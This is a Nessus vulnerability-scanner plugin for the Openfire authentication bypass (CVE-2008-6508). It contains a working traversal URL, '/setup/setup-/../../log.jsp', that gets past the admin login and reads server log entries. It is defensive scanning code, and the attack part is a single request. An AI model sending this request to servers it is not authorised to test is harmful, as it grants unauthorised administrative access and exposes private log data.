#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(34725);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2008-6508");
  script_bugtraq_id(32189);
  script_osvdb_id(49663);
  script_xref(name:"EDB-ID", value:"19432");
  script_xref(name:"Secunia", value:"32478");

  script_name(english:"Openfire AuthCheck Authentication Bypass");
  script_summary(english:"Grabs up to 10 log lines");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application that is affected by an
authentication bypass vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Openfire / Wildfire, an instant messaging
server supporting the XMPP protocol. 

The installed version of this software contains a design error in its
admin interface in that it allows URLs starting with certain strings,
such as 'setup/setup-', to circumvent its auth check mechanism.  A
remote attacker can leverage this issue to bypass authentication and
gain administrative access to the application. 

Based on the presence of this vulnerability, it is likely that the
admin interface in the installed version is also affected by multiple
cross-site scripting issues as well as a SQL injection vulnerability
that allows an attacker to write files to disk and execute code at the
operating system level.  Nessus has not, though, checked for these
other issues." );
 # http://web.archive.org/web/20081227173635/http://www.andreas-kurtz.de/advisories/AKADV2008-001-v1.0.txt
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?bf579d52");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2008/Nov/155" );
 script_set_attribute(attribute:"see_also", value:"http://www.igniterealtime.org/issues/browse/JM-1489" );
 script_set_attribute(attribute:"see_also", value:"http://www.igniterealtime.org/builds/openfire/docs/latest/changelog.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.igniterealtime.org/community/message/182518" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Openfire 3.6.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Openfire Admin Console Authentication Bypass');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_cwe_id(22);
  script_set_attribute(attribute:"plugin_publication_date", value: "2008/11/09");
  script_cvs_date("$Date: 2016/11/02 14:37:07 $");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:igniterealtime:openfire");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 9090);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:9090);


# Exploit the issue to read some of the log entries.
log_type = "info";                                         # one of "error", "warn", "info", or "debug"
max_lines = 10;

url = string(
  "/setup/setup-/../../log.jsp?",
  "log=", log_type, "&",
  "mode=asc&",
  "lines=", max_lines
);

req = http_mk_get_req(port:port, item:url);
res = http_send_recv_req(port:port, req:req);
if (isnull(res)) exit(0);


# There's a problem if we see some entries.
if (
  string("<title>", log_type, "</title>") >< res[2] &&
  (
    '<th class="head-num">line</th>' >< res[2] ||
    '<td width="99%" class="line">' >< res[2]
  )
)
{
  if (report_verbosity)
  {
    req_str = http_mk_buffer_from_req(req:req);
    report = string(
      "\n",
      "Nessus was able to exploit this issue to read log entries on the\n",
      "remote Openfire server using the following URL :\n",
      "\n",
      "  ", str_replace(find:'\r\n', replace:'\n  ', string:req_str),
      "\n",
      "Note that some browsers canonicalize URLs, which causes them to remove\n",
      "directory traversal sequences before sending the request. As as result,\n",
      "you may need to send the request by hand to validate this result.\n"
    );
    if (report_verbosity > 1)
    {
      output = "";
      foreach line (split(res[2], keep:FALSE))
      {
        if ('<nobr><span class="date" title="' >< line && "</span>" >< line)
        {
          entry = strstr(line, "<span");
          entry = strstr(entry, '>') - '>';
          entry = entry - "</span>";
          output += '  ' + entry + '\n';
        }
      }
      if (output)
        report = string(
          report,
          "\n",
          "Here are the first few entries from the '", log_type, "' log that Nessus was\n",
          "able to read :\n",
          "\n",
          output
        );
      else
        report = string(
          report,
          "\n",
          "There are no entries currently in the '", log_type, "' log.\n"
        );
    }
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
